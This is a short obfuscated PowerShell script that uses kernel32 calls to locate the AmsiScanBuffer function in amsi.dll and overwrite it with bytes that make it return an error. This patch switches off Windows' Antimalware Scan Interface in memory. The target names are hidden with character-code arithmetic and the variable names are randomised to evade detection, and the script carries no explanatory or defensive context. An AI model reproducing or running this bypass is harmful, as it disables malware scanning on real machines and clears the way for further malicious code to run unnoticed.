$ZHXQsCHWRWD = @"
using System;
using System.Runtime.InteropServices;
public class ZHXQsCHWRWD {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr f62lE0, string xyeuZ);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr _rMXlae_Fp7ZT0A, UIntPtr TiFTiQ_n1CkMnk, uint BKWMFSckjUEhG, out uint mmhTP8Xdj);
}
"@

Add-Type $ZHXQsCHWRWD

$VXa7 = [ZHXQsCHWRWD]::LoadLibrary("$([CHAr]([bytE]0x61)+[char](61+48)+[cHaR]([byTE]0x73)+[chAr](105)+[char](46+39-39)+[cHar]([Byte]0x64)+[cHaR]([bYTE]0x6c)+[ChaR]([byte]0x6c))")
$qUthfN2SR = [ZHXQsCHWRWD]::GetProcAddress($VXa7, "$([CHar]([BytE]0x41)+[chaR]([byTe]0x6d)+[chAr](115+91-91)+[cHAr](105)+[char](83*23/23)+[chAR]([BYTE]0x63)+[cHaR]([BYte]0x61)+[CHAr](110+60-60)+[CHaR](66*26/26)+[CHAr](117*20/20)+[ChaR]([bYte]0x66)+[Char](56+46)+[chaR](101+13-13)+[CHaR]([bytE]0x72))")
$p = 0
[ZHXQsCHWRWD]::VirtualProtect($qUthfN2SR, [uint32]5, 0x40, [ref]$p)
$OzVkkVt0R = "0xB8"
$XU4_7rPW3qlt3VC9Cs = "0x57"
$zQlxXFUtMCPrnmxje6 = "0x00"
$ZZ5pyau = "0x07"
$qXOAuow_Wx_b = "0x80"
$EznJ2fxc6YG = "0xC3"
$dqueX2J5vNc = [Byte[]] ($OzVkkVt0R,$XU4_7rPW3qlt3VC9Cs,$zQlxXFUtMCPrnmxje6,$ZZ5pyau,+$qXOAuow_Wx_b,+$EznJ2fxc6YG)
[System.Runtime.InteropServices.Marshal]::Copy($dqueX2J5vNc, 0, $qUthfN2SR, 6)